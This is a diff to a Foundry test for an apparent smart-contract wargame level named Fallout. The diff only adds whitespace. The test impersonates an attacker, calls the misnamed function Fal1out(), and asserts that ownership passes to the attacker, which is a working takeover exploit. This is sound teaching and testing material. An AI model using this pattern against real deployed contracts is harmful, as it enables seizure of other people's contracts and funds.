@@ -15,9 +15,13 @@ contract FalloutTest is Test {
 
     function testFalloutContract() external{
     vm.deal(attacker, 1 ether);
+
     vm.startPrank(attacker);
+    
     fallout.Fal1out();
+    
     address newOwner = fallout.owner();
+    
     assertEq(newOwner,attacker,"New owner not set. Attack failed.");
     vm.stopPrank();   
     }
